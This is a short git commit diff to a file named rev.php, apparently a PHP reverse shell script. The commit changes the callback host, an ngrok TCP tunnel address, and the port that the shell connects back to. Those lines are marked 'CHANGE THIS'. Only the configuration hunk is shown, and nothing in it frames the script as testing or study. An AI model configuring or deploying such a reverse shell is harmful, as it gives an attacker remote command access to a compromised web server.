341a4f7cf2426902d1245e06da397255aeb7fbe4
Gradur101010 <95391328+Gradur101010@users.noreply.github.com>
2022-06-06 23:11:36 +0100

    Update rev.php

--- rev.php
+++ rev.php
@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '5.tcp.eu.ngrok.io'; // CHANGE THIS
-$port = 14912;       // CHANGE THIS
+$ip = '7.tcp.eu.ngrok.io'; // CHANGE THIS
+$port = 14251;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
